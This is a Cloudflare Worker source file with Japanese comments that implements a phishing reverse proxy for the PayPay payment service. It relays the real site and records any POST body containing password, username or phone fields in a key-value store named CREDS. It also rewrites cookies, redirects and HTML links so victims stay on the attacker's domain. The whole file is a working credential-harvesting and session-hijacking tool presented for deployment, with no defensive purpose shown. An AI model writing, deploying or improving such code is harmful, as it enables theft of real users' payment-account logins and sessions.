// Cloudflare Worker — reverse proxy to PayPay + credential store
// KV binding: CREDS
// Deploy: wrangler deploy
//
// 本物の www.paypay.ne.jp を中継する。
// ログインエンドポイントは推測しない（Vue バンドル内のため不明）。
// POST ボディに phone/password らしいフィールドがあれば KV に保存する。

const TARGET_ORIGIN = "https://www.paypay.ne.jp";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const workerHost = url.host;

    // 既存の store API （X-Secret がある場合）はそのまま
    const secret = (env.SECRET || "").trim();
    if (secret && request.headers.get("X-Secret") === secret && request.method === "POST") {
      return handleStore(request, env);
    }

    // リバースプロキシ
    return proxy(request, env, workerHost);
  },
};

async function proxy(request, env, workerHost) {
  const url = new URL(request.url);
  const targetUrl = TARGET_ORIGIN + url.pathname + url.search;

  const headers = new Headers(request.headers);
  headers.set("Host", "www.paypay.ne.jp");
  headers.delete("cf-connecting-ip");
  headers.delete("cf-ray");
  headers.delete("cf-visitor");

  // POST ボディをキャプチャ（ログインらしいもの）
  let body = request.body;
  if (request.method === "POST" || request.method === "PUT") {
    const clone = request.clone();
    try {
      const text = await clone.text();
      if (text && (text.includes("password") || text.includes("username") || text.includes("phone"))) {
        const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
        await env.CREDS.put(key, JSON.stringify({
          type: "captured_post",
          path: url.pathname,
          body: text.slice(0, 2000),
          ts: new Date().toISOString(),
          ua: request.headers.get("User-Agent") || "",
        }));
      }
      body = text;
    } catch {
      // ignore
    }
  }

  const res = await fetch(targetUrl, {
    method: request.method,
    headers,
    body: (request.method !== "GET" && request.method !== "HEAD") ? body : undefined,
    redirect: "manual",
  });

  const newHeaders = new Headers(res.headers);

  // Set-Cookie Domain 書き換え
  const setCookies = newHeaders.getAll("set-cookie") || [];
  newHeaders.delete("set-cookie");
  for (const c of setCookies) {
    let rewritten = c
      .replace(/Domain=[^;]+/gi, `Domain=${workerHost}`)
      .replace(/domain=[^;]+/gi, `domain=${workerHost}`);
    newHeaders.append("set-cookie", rewritten);
  }

  // Location 書き換え
  const loc = newHeaders.get("location");
  if (loc && loc.includes("paypay.ne.jp")) {
    newHeaders.set("location", loc.replace(/https?:\/\/[^/]*paypay\.ne\.jp/g, `https://${workerHost}`));
  }

  // HTML のドメイン書き換え
  const contentType = newHeaders.get("content-type") || "";
  if (contentType.includes("text/html")) {
    let html = await res.text();
    html = html
      .replace(/https?:\/\/[^"'\s]*paypay\.ne\.jp/g, (m) => m.replace(/https?:\/\/[^/]*paypay\.ne\.jp/, `https://${workerHost}`))
      .replace(/https?:\/\/cdn\.assets\.paypay\.ne\.jp/g, "https://cdn.assets.paypay.ne.jp") // CDNはそのまま（必要なら後で変更）
      .replace(/https?:\/\/static\.paypay\.ne\.jp/g, "https://static.paypay.ne.jp");
    return new Response(html, {
      status: res.status,
      headers: newHeaders,
    });
  }

  return new Response(res.body, {
    status: res.status,
    headers: newHeaders,
  });
}

async function handleStore(request, env) {
  let body;
  try { body = await request.json(); } catch { body = {}; }
  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
  await env.CREDS.put(key, JSON.stringify(body));
  return json({ ok: true, key });
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data, null, 2), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}
